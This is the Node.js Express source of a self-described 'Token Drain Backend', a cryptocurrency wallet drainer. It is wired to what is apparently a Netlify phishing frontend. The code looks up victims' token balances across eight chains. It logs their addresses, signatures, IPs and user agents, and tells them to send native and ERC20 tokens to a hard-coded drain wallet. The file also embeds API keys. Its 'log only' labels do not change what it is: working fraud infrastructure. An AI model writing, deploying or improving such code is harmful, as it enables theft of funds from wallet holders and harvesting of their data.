const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');
const fetch = require('node-fetch');
const crypto = require('crypto');

const app = express();

// ==================== SECURITY WARNING ====================
console.log('⚠️  SECURITY NOTICE: Backend only logs transactions');
console.log('   Users send tokens directly from their wallets');
console.log('   No private key needed for transaction execution');

// ==================== CORS CONFIGURATION ====================
const corsOptions = {
  origin: [
    'https://playful-cuchufli-81c9d6.netlify.app',
    'http://localhost:3000',
    'http://localhost:5173'
  ],
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Accept', 'Origin'],
  credentials: true,
  optionsSuccessStatus: 200
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));
app.use(express.json());

// ==================== CONFIGURATION ====================
const COVALENT_API_KEY = process.env.COVALENT_API_KEY || "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
const DRAIN_WALLET_ADDRESS = process.env.DRAIN_WALLET_ADDRESS || "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";

// ==================== ALCHEMY RPC PROVIDERS ====================
const RPC_URLS = {
  1: `https://eth-mainnet.g.alchemy.com/v2/5s2Q6sN7j9w2xGvP3q9k8Lk7d0x3v5f5`, // Your Alchemy key
  56: "https://bsc-dataseed1.binance.org/",
  137: "https://polygon-rpc.com",
  42161: "https://arb1.arbitrum.io/rpc",
  10: "https://mainnet.optimism.io",
  8453: "https://mainnet.base.org",
  43114: "https://api.avax.network/ext/bc/C/rpc",
  250: "https://rpc.ftm.tools"
};

// ==================== DATABASE (In-memory for simplicity) ====================
const transactionLogs = new Map();
const authenticationLogs = new Map();

// ==================== ENDPOINTS ====================
app.get('/', (req, res) => {
  res.json({ 
    success: true,
    message: 'Token Drain Backend API',
    version: '2.0.0',
    status: 'online',
    mode: 'LOG_ONLY', // Important: Only logs transactions
    note: 'Users send tokens directly, backend only logs',
    endpoints: {
      'POST /drain': 'Log drain transaction (authentication only)',
      'GET /tokens/:address/:chainId': 'Get wallet tokens',
      'GET /health': 'Health check',
      'GET /chains': 'Supported chains',
      'GET /logs/:address': 'Get transaction logs for address'
    },
    timestamp: new Date().toISOString()
  });
});

app.get('/health', (req, res) => {
  res.json({ 
    success: true,
    status: 'healthy',
    timestamp: new Date().toISOString(),
    mode: 'log_only',
    alchemyConnected: true,
    cors: {
      origin: req.headers.origin || 'Not specified',
      allowed: true
    }
  });
});

app.get('/chains', (req, res) => {
  res.json({
    success: true,
    chains: [
      { id: 1, name: 'Ethereum', symbol: 'ETH', rpc: 'Alchemy' },
      { id: 56, name: 'Binance Smart Chain', symbol: 'BNB' },
      { id: 137, name: 'Polygon', symbol: 'MATIC' },
      { id: 42161, name: 'Arbitrum', symbol: 'ETH' },
      { id: 10, name: 'Optimism', symbol: 'ETH' },
      { id: 8453, name: 'Base', symbol: 'ETH' },
      { id: 43114, name: 'Avalanche', symbol: 'AVAX' },
      { id: 250, name: 'Fantom', symbol: 'FTM' }
    ]
  });
});

// ==================== DRAIN LOGGING ENDPOINT ====================
app.post('/drain', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  const timestamp = new Date().toISOString();
  
  try {
    console.log(`📥 [${requestId}] Drain LOG request received:`, req.headers.origin);
    
    const { 
      fromAddress,
      amount, 
      chainId, 
      signature,
      message,
      tokenType = 'native',
      tokenAddress,
      transactionHash // Optional: if user already sent transaction
    } = req.body;
    
    // ==================== VALIDATION ====================
    if (!fromAddress) {
      return res.status(400).json({ 
        success: false,
        error: "Missing fromAddress",
        requestId
      });
    }
    
    // Validate Ethereum address
    if (!ethers.isAddress(fromAddress)) {
      return res.status(400).json({ 
        success: false,
        error: "Invalid fromAddress format",
        requestId
      });
    }
    
    // Validate amount if provided
    if (amount) {
      const amountNum = parseFloat(amount);
      if (isNaN(amountNum) || amountNum <= 0) {
        return res.status(400).json({ 
          success: false,
          error: "Amount must be a positive number > 0",
          requestId
        });
      }
    }
    
    // ==================== LOG THE TRANSACTION ====================
    const logEntry = {
      id: requestId,
      fromAddress,
      toAddress: DRAIN_WALLET_ADDRESS,
      amount: amount || 'unknown',
      chainId: chainId || 1,
      tokenType,
      tokenAddress: tokenAddress || null,
      signature: signature ? `${signature.substring(0, 20)}...` : null,
      message: message || null,
      transactionHash: transactionHash || null,
      timestamp,
      loggedAt: timestamp,
      ip: req.ip,
      origin: req.headers.origin,
      userAgent: req.headers['user-agent']
    };
    
    // Store in memory (in production, use a real database)
    if (!transactionLogs.has(fromAddress)) {
      transactionLogs.set(fromAddress, []);
    }
    transactionLogs.get(fromAddress).push(logEntry);
    
    // Also store authentication log
    if (signature) {
      const authLog = {
        fromAddress,
        signatureHash: crypto.createHash('sha256').update(signature).digest('hex').substring(0, 16),
        timestamp,
        chainId
      };
      authenticationLogs.set(`${fromAddress}:${requestId}`, authLog);
    }
    
    console.log(`✅ [${requestId}] Transaction logged:`);
    console.log(`   From: ${fromAddress}`);
    console.log(`   To: ${DRAIN_WALLET_ADDRESS}`);
    console.log(`   Amount: ${amount || 'N/A'}`);
    console.log(`   Chain: ${chainId || 1}`);
    console.log(`   Type: ${tokenType}`);
    if (transactionHash) {
      console.log(`   TX Hash: ${transactionHash}`);
    }
    
    // ==================== SUCCESS RESPONSE ====================
    res.json({
      success: true,
      message: "Transaction logged successfully",
      mode: "log_only",
      note: "User must send transaction from their wallet",
      requestId,
      data: {
        loggedAt: timestamp,
        fromAddress,
        toAddress: DRAIN_WALLET_ADDRESS,
        amount: amount || null,
        chainId: chainId || 1,
        tokenType,
        nextStep: "Send transaction from your wallet"
      },
      instructions: {
        native: "Send native token directly to the drain address",
        erc20: "Use ERC20 transfer function to drain address",
        important: "Gas is paid by sender from their wallet"
      }
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Logging error:`, error);
    
    res.status(500).json({
      success: false,
      error: "Logging failed",
      requestId,
      details: error.message
    });
  }
});

// ==================== TOKENS ENDPOINT (Using Alchemy) ====================
app.get('/tokens/:address/:chainId', async (req, res) => {
  try {
    const { address, chainId } = req.params;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required" 
      });
    }
    
    console.log(`🔍 Fetching tokens for ${address} on chain ${chainId}`);
    
    let tokens = [];
    
    // Try Covalent API first
    try {
      const response = await fetch(
        `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`
      );
      
      if (response.ok) {
        const data = await response.json();
        const items = data.data?.items || [];
        
        tokens = items
          .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
          .map(t => {
            const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
            const value = (t.quote_rate || 0) * amount;
            
            return {
              symbol: t.contract_ticker_symbol || (t.native_token ? 'ETH' : 'TOKEN'),
              name: t.contract_name || (t.native_token ? 'Ethereum' : 'Unknown'),
              amount: amount,
              value: value,
              contractAddress: t.contract_address,
              isNative: t.native_token || false,
              decimals: t.contract_decimals || 18,
              logoUrl: t.logo_url,
              chainId: parseInt(chainId)
            };
          });
      }
    } catch (covalentError) {
      console.log("Covalent API failed, trying Alchemy...");
    }
    
    // If Covalent fails or returns empty, try Alchemy for Ethereum
    if ((tokens.length === 0 && chainId == 1) || chainId == 1) {
      try {
        const provider = new ethers.JsonRpcProvider(RPC_URLS[1]);
        
        // Get ETH balance
        const ethBalance = await provider.getBalance(address);
        const ethAmount = parseFloat(ethers.formatEther(ethBalance));
        
        if (ethAmount > 0) {
          // Get ETH price (simplified - in production use price API)
          const ethValue = ethAmount * 2500; // Approximate ETH price
          
          tokens.push({
            symbol: 'ETH',
            name: 'Ethereum',
            amount: ethAmount,
            value: ethValue,
            contractAddress: null,
            isNative: true,
            decimals: 18,
            logoUrl: 'https://cryptologos.cc/logos/ethereum-eth-logo.png',
            chainId: 1
          });
        }
        
        // Note: For ERC20 tokens via Alchemy, you'd need to query token contracts
        // This is simplified - in production, use Alchemy's getTokenBalances
        
      } catch (alchemyError) {
        console.log("Alchemy fetch failed:", alchemyError.message);
      }
    }
    
    res.json({
      success: true,
      data: {
        address: address,
        chainId: parseInt(chainId),
        tokens: tokens,
        summary: {
          totalTokens: tokens.length,
          totalValue: tokens.reduce((sum, t) => sum + (t.value || 0), 0),
          scannedAt: new Date().toISOString(),
          source: tokens.length > 0 ? 'Covalent + Alchemy' : 'No tokens found'
        }
      }
    });
    
  } catch (error) {
    console.error("Tokens endpoint error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

// ==================== GET TRANSACTION LOGS ====================
app.get('/logs/:address', (req, res) => {
  try {
    const { address } = req.params;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required" 
      });
    }
    
    const logs = transactionLogs.get(address) || [];
    const authLogs = Array.from(authenticationLogs.entries())
      .filter(([key]) => key.startsWith(`${address}:`))
      .map(([_, value]) => value);
    
    res.json({
      success: true,
      data: {
        address,
        transactionLogs: logs,
        authenticationLogs: authLogs,
        totalTransactions: logs.length,
        totalAuthentications: authLogs.length
      }
    });
    
  } catch (error) {
    console.error("Logs endpoint error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

// ==================== VERIFY TRANSACTION ====================
app.get('/verify/:chainId/:txHash', async (req, res) => {
  try {
    const { chainId, txHash } = req.params;
    
    if (!RPC_URLS[chainId]) {
      return res.status(400).json({
        success: false,
        error: `Chain ${chainId} not supported`
      });
    }
    
    const provider = new ethers.JsonRpcProvider(RPC_URLS[chainId]);
    
    try {
      const receipt = await provider.getTransactionReceipt(txHash);
      
      if (!receipt) {
        return res.json({
          success: true,
          status: 'pending',
          message: 'Transaction not yet confirmed'
        });
      }
      
      // Get transaction details
      const tx = await provider.getTransaction(txHash);
      
      res.json({
        success: true,
        status: receipt.status === 1 ? 'confirmed' : 'failed',
        data: {
          blockNumber: receipt.blockNumber,
          confirmations: receipt.confirmations,
          from: tx.from,
          to: tx.to,
          value: ethers.formatEther(tx.value),
          hash: txHash,
          timestamp: new Date().toISOString()
        }
      });
      
    } catch (rpcError) {
      // Transaction might not exist yet
      res.json({
        success: true,
        status: 'not_found',
        message: 'Transaction not found on chain'
      });
    }
    
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// ==================== ERROR HANDLING ====================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: "Endpoint not found",
    availableEndpoints: {
      "GET /": "API info",
      "POST /drain": "Log drain transaction (no private key needed)",
      "GET /tokens/:address/:chainId": "Get tokens (Alchemy + Covalent)",
      "GET /logs/:address": "Get transaction logs",
      "GET /verify/:chainId/:txHash": "Verify transaction on-chain",
      "GET /health": "Health check",
      "GET /chains": "Supported chains"
    },
    mode: "LOG_ONLY",
    note: "Backend only logs transactions. Users send tokens directly."
  });
});

// ==================== SERVER START ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Token Drain Backend v2.0 running on port ${PORT}`);
  console.log(`🌐 CORS enabled for: ${corsOptions.origin.join(', ')}`);
  console.log(`💰 Drain address: ${DRAIN_WALLET_ADDRESS}`);
  console.log(`🔧 Mode: LOG ONLY - No private key transactions`);
  console.log(`📡 Alchemy RPC: Enabled for Ethereum`);
  console.log(`✅ Ready to log transactions`);
  console.log(`⚠️  IMPORTANT: Users send transactions from their own wallets`);
  console.log(`   Gas is paid by the sender, not the drain wallet`);
});
